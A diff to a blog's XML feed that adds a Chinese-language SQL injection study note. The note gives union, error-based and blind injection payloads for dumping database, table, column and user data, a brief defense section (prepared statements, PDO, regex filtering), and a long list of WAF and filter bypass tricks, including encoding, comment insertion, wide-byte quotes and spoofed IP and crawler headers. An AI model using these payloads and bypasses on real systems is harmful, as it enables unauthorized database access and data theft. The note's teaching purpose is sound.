@@ -11,9 +11,133 @@
     <updated>2023-04-09T03:33:00.000Z</updated>
     <entry>
         <id>http://example.com/2023/04/09/hello-world/</id>
-        <title>haha</title>
+        <title>SQL注入</title>
         <link rel="alternate" href="http://example.com/2023/04/09/hello-world/"/>
-        <content type="html">&lt;p&gt;nihao&lt;/p&gt;
+        <content type="html">&lt;h1 id=&#34;本周重点&#34;&gt;&lt;a href=&#34;#本周重点&#34; class=&#34;headerlink&#34; title=&#34;本周重点&#34;&gt;&lt;/a&gt;本周重点&lt;/h1&gt;&lt;h3 id=&#34;1-产生原理（实质）&#34;&gt;&lt;a href=&#34;#1-产生原理（实质）&#34; class=&#34;headerlink&#34; title=&#34;1.产生原理（实质）&#34;&gt;&lt;/a&gt;1.产生原理（实质）&lt;/h3&gt;&lt;p&gt;1.用户能调控参数（像id=2 union select 1,2,3–+)要能添加代码&lt;br&gt;2.原本数据库只执行（id=2)语句，但执行了用户拼接的一些代码&lt;/p&gt;
+&lt;h3 id=&#34;2-类型&#34;&gt;&lt;a href=&#34;#2-类型&#34; class=&#34;headerlink&#34; title=&#34;2.类型&#34;&gt;&lt;/a&gt;2.类型&lt;/h3&gt;&lt;p&gt;1.联合注入&lt;br&gt;        2.堆叠注入&lt;br&gt;        3.宽字节注入&lt;br&gt;        4.cookie注入&lt;br&gt;        5.XFF头注入&lt;br&gt;        6.UA注入（user-agent注入）&lt;br&gt;        7.Referer注入&lt;br&gt;        8.二次注入&lt;br&gt;        9.base64注入&lt;br&gt;        11.万能密码&lt;br&gt;        12.文件读写&lt;br&gt;盲注类型：&lt;br&gt;        1.基于时间的盲注     sleep()   benchmark()&lt;br&gt;        2.基于布尔的注入&lt;br&gt;        3.基于报错的注入     updatexml()  extractvalue()  floor()  exp()&lt;/p&gt;
+&lt;h3 id=&#34;语言&#34;&gt;&lt;a href=&#34;#语言&#34; class=&#34;headerlink&#34; title=&#34;语言&#34;&gt;&lt;/a&gt;语言&lt;/h3&gt;&lt;pre&gt;&lt;code class=&#34;SQL&#34;&gt;一，union select
+?id=-2 &amp;#39;   &amp;quot;   )     &amp;#39;)    &amp;quot;)      ]     )]
+order by 3 --+
+union select 1,2,3 --+
+union select 1,database(),3 --+
+union select 1,select group_concat(table_name) from information_schema.tables where table_schema=database(),3 --+
+union select 1,select group_concat(column_name)from information_schema.columns where table_schema=database() and table_name =&amp;quot;&amp;quot;,3--+
+union select 1,select group_concat(id)from users,3 --+
+二，报错注入
+1.and extractvalue(1,concat(0x7e,(database()),0x7e)) --+
+2.and updatexml(1,(concat(0x3a,(database()),0x3a)),1) --+
+0x7e----&amp;gt;~
+0x3a----&amp;gt;:
+三,爆出
+index.php?id=2&amp;#39; and (select 1 from (select count(*),concat(0x3a,0x3a,(database()),0x3a,0x3a,floor(rand()*2))a from information_schema.tables group by a)b) --+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h3 id=&#34;3-如何防范&#34;&gt;&lt;a href=&#34;#3-如何防范&#34; class=&#34;headerlink&#34; title=&#34;3.如何防范&#34;&gt;&lt;/a&gt;3.如何防范&lt;/h3&gt;&lt;h4 id=&#34;存在哪些风险、对应的对策是什么。&#34;&gt;&lt;a href=&#34;#存在哪些风险、对应的对策是什么。&#34; class=&#34;headerlink&#34; title=&#34;存在哪些风险、对应的对策是什么。&#34;&gt;&lt;/a&gt;存在哪些风险、对应的对策是什么。&lt;/h4&gt;&lt;blockquote&gt;
+&lt;p&gt;1.预编译  （数据库不会将参数的内容视为SQL命令执行，而是作为一个字段的属性值来处理）&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;2.PDO预处理                 (本地和Mysql服务端使用字符集对输入进行转义)&lt;/p&gt;
+&lt;blockquote&gt;
+&lt;p&gt;3.正则表达式过滤          (如果用户输入了非法信息则利用正则表达式过滤)&lt;br&gt; 4那如何反防范呢？&lt;br&gt;接下来将展示一些绕过的姿势。&lt;br&gt;1.屏蔽or and 空格 注释符&lt;br&gt;or 用|| 或  |&lt;br&gt;and 用&amp;amp;&amp;amp; 或&amp;amp;&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;/blockquote&gt;
+&lt;/blockquote&gt;
+&lt;h3 id=&#34;4那如何反防范呢？&#34;&gt;&lt;a href=&#34;#4那如何反防范呢？&#34; class=&#34;headerlink&#34; title=&#34;4那如何反防范呢？&#34;&gt;&lt;/a&gt;4那如何反防范呢？&lt;/h3&gt;&lt;h4 id=&#34;接下来将展示一些绕过的姿势。&#34;&gt;&lt;a href=&#34;#接下来将展示一些绕过的姿势。&#34; class=&#34;headerlink&#34; title=&#34;接下来将展示一些绕过的姿势。&#34;&gt;&lt;/a&gt;接下来将展示一些绕过的姿势。&lt;/h4&gt;&lt;blockquote&gt;
+&lt;p&gt;替代空格的东西&lt;br&gt;%09 水平tab键&lt;br&gt;%0a 新建一行&lt;br&gt;%0c 新建一页&lt;br&gt;%0d 回车键&lt;br&gt;%0b 垂直tab键&lt;br&gt;%a0 也是空格键&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;blockquote&gt;
+&lt;p&gt;屏蔽–+号&lt;br&gt;用 or ‘1’ =’1 代替&lt;br&gt;如&lt;br&gt;?id=2000000’%0aunion%0aselect%0a1,2,3%0a||%0a’1’=’1&lt;br&gt;如果哪天%的空格都不能用，不用空格&lt;br&gt;无空格写法用（）&lt;br&gt;?id=1’||(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(infoorrmation_schema.tables)where(table_schema)like(database())),0x7e),1))||’1’=’1&lt;/p&gt;
+&lt;/blockquote&gt;
+&lt;hr&gt;
+&lt;pre&gt;&lt;code class=&#34;SQL&#34;&gt;小知识:
+对&amp;#39; \ 屏蔽，前面多加个\
+数据库用的是gbk编码，会把2个字符当作一个汉字
+如：
+?id=1%df\&amp;#39;（在机器看来这就是个1+字符+&amp;#39;)
+post类
+burp抓包
+在目标位置admin%df%27 union select 1,2 #
+
+常见绕过：
+1.大小写绕过
+Union SelEct
+2.双写绕过
+ununionion
+3.编码绕过
+security--&amp;gt;hex编码
+urlencode
+4.注释符/**/
+uni/**/on sel/**/ect
+5.对于空格绕过
+开头已提过了
+6.对于or and绕过
+and = &amp;amp;&amp;amp;
+or = ||
+7.单引号
+%df%27
+8.反引号
+反引号只能在表名，一般情况下如果表名和语法一样，那么就必须用反引号修饰，否则数据库会误以为这是语法！！！！！！！！！！！！！！！！！！！！！！
+select username,password from `table1` where id=&amp;#39;1&amp;#39; limit 0,1
+where
+select * from `where` where id =1
+9.内联注释
+and /*!select*/ 1,2
+10.&amp;lt;&amp;gt;绕过
+uni&amp;lt;&amp;gt;on sel&amp;lt;&amp;gt;ect
+对了这里加一布尔型的盲注(猜库名
+select * from users where id=1 and ascii(substr(database(),0,1)) &amp;gt; 115
+greatest least
+select * from users where id=1 and greatest(ascii(substr(database(),0,1)),64)=64
+
+
+11.屏蔽逗号
+select substr(&amp;quot;xxxxx&amp;quot;,1,3)
+select substr(&amp;quot;xxxxx&amp;quot; from 1 to 3)
+
+union select 1,2,3
+union select * from (select 1)a join (select 2)b join (select 3)c;
+
+limit 0,1
+limit 0 offset 1
+12.sleep屏蔽
+and sleep(1)
+and benchmark(100000000（0的个数视情况而定）,1);
+13.group_concat屏蔽
+select group_concat(&amp;quot;haha&amp;quot;,&amp;quot;niao&amp;quot;);
+select concat_ws(&amp;quot; &amp;quot;,&amp;quot;haha&amp;quot;,&amp;quot;niao&amp;quot;);
+（把&amp;quot;&amp;quot;放到&amp;quot;haha&amp;quot;,&amp;quot;niao&amp;quot;中间并合并输出）
+14.等号屏蔽
+用 like rlike regexp &amp;lt;&amp;gt;(不等号)?id=1&amp;#39; or 1 like 1
+?id=1&amp;#39; or 1 &amp;lt;&amp;gt; 1
+15.post情况屏蔽#
+id=3&amp;quot;) or 1=1 -- a 使用--空格a可以在post情况下替代#
+16.ip地址拦截（只允许内网访问）
+X-forwarded-for：ip地址
+X-remote-IP：ip地址
+X-Originating-IP：ip地址
+X-remote-addr：ip地址
+X-Real-Ip：ip地址
+(一般放在抓包中间，DNT之后)
+17.修改静态资源
+http://www.xx.com/sql.php?id=1
+可以替换为
+http://www.xx.com/sql.php/1.js?id=1
+18.url白名单
+为了防止防火墙误伤，部分waf(防火墙)内置白名单列表 admin manager system...
+如:
+http://www.xx.com/sql.php/admin.php?id=1
+http://www.xx.com/sql.php?xxxx=/manager/&amp;amp;b=攻击代码
+
+http://www.xx.com/../../../../manager/../sql.php?id=1
+19.爬虫白名单(waf让baidu等搜索引擎蜘蛛能进入)
+伪造自己是搜索引擎（修改user-agent）
+将user-agent改为baidu等一些搜索引擎蜘蛛的user-agent
+20.数据库注释执行
+/*!50001 select * from table1*/;
+如果数据库版本是5.00.01 版本以下的，语句才会执行
+/*!45509 union select */ 1,2,3 --+
+21.增加干扰
+union all %23%a0 select 1,2,3 --+
+&lt;/code&gt;&lt;/pre&gt;
+&lt;h4 id=&#34;思考&#34;&gt;&lt;a href=&#34;#思考&#34; class=&#34;headerlink&#34; title=&#34;思考&#34;&gt;&lt;/a&gt;思考&lt;/h4&gt;&lt;p&gt;有什么想法或心得体会，都可以拿出来分享下。&lt;/p&gt;
 </content>
         <updated>2023-04-09T03:33:00.000Z</updated>
     </entry>
